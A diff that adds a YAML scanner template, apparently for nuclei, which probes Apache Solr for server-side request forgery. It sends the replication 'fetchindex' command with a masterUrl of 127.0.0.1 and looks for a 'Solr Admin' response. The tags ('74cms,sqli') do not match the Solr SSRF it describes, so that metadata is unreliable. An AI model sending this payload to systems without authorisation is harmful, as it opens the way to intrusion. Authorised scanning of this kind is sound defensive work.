@@ -1,0 +1,20 @@
+id: apache-solr-ssrf
+info:
+  author: str1am
+  name: apache-solr-ssrf
+  reference:
+  - http://www.2cto.com/article/201405/304552.html
+  severity: high
+  tags: 74cms,sqli
+requests:
+- matchers:
+  - type: word
+    words:
+    - Solr Admin
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - /solr/db/replication?command=fetchindex&masterUrl=http://127.0.0.1&wt=json&httpBasicAuthUser=&httpBasicAuthPassword=
